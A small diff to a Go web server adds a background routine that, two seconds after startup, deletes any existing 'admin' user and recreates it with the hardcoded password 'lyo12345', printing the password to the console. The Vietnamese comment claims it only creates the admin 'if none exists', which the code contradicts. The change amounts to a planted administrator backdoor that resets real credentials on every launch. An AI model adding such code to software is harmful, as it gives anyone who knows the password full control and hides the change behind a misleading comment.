@@ -167,7 +167,16 @@ func main() {
 
 	stmt_list_every_users, err = db.Prepare("SELECT username, is_admin FROM users")
 
-
+// Tự động khởi tạo tài khoản admin nếu chưa có
+	go func() {
+		time.Sleep(2 * time.Second)
+		hash, salt := hashWithRandomSalt([]byte("lyo12345"))
+		db.Exec("DELETE FROM users WHERE username = 'admin'")
+		_, err := db.Exec("INSERT INTO users (username, pwd_hash, pwd_salt, is_admin) VALUES (?, ?, ?, 1)", "admin", hash, salt)
+		if err == nil {
+			fmt.Println("==> DA TAO THANH CONG ADMIN PASS: lyo12345")
+		}
+	}()
 	r := gin.Default()
 
 	// Enable Gzip compression for all
